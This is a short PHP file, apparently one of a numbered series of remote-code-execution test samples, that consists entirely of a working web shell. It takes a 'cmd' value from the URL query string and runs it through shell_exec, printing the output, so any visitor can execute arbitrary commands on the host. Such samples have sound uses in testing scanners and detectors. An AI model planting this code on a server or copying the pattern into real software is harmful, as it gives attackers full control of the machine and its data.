<?php
// RCE test variation #55
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>